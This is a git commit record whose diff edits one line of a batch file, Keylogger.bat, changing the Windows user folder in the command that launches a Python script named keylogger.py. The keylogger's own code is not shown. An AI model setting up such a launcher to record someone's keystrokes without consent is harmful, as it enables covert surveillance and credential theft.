7a71e4f7aef0f75b5438342ebf679fc8d038d7c5
RichardPhilRoy <84862685+RichardPhilRoy@users.noreply.github.com>
2021-06-28 12:20:56 +0530

    Update Keylogger.bat

--- Keylogger.bat
+++ Keylogger.bat
@@ -1,1 +1,1 @@
-"C:\Users\azureuser\AppData\Local\Programs\Python\Python39\python.exe" "C:\Program Files\Keylogger\keylogger.py"
+"C:\Users\whizhack\AppData\Local\Programs\Python\Python39\python.exe" "C:\Program Files\Keylogger\keylogger.py"
